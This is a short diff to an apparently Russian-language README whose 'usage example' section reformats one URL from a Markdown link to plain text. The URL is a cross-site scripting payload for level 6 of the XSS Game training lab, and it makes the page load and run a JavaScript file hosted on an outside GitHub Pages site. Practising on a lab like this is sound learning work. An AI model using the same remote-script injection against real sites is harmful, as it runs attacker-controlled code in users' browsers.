@@ -7,4 +7,4 @@
 
 ## Пример использования
 ```text
-[https://xss-game.appspot.com/level6/frame#//xeone52670v3.github.io/xss-test/x.js](https://xss-game.appspot.com/level6/frame#//xeone52670v3.github.io/xss-test/x.js)
+https://xss-game.appspot.com/level6/frame#//xeone52670v3.github.io/xss-test/x.js
